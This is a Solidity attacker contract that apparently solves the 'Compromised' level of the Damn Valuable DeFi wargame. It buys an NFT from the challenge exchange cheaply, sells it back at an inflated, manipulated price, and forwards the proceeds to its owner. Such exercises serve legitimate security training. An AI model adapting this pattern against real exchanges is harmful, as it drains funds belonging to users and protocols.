// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./Exchange.sol";
import "../DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract CompromisedHack is IERC721Receiver {
  address public owner;
  Exchange public exchange;
  uint256 public NFTId;

  constructor(address payable _exchange) {
    owner = msg.sender;
    exchange = Exchange(_exchange);
  }

  function buyNFT() external payable {
    require(msg.sender == owner, 'only owner');
    
    NFTId = exchange.buyOne{value: msg.value}();

  }

    function sellBack() external {
    require(msg.sender == owner, 'only owner');
    // Sell back at higher price and send owner balance
    DamnValuableNFT(exchange.token()).approve(address(exchange), NFTId);
    exchange.sellOne(NFTId);

    payable(owner).call{value: address(this).balance}("");
  }

  function onERC721Received(
      address operator,
      address from,
      uint256 tokenId,
      bytes calldata data
  ) external returns (bytes4) {
    return IERC721Receiver.onERC721Received.selector;
  }


  receive() external payable {}
}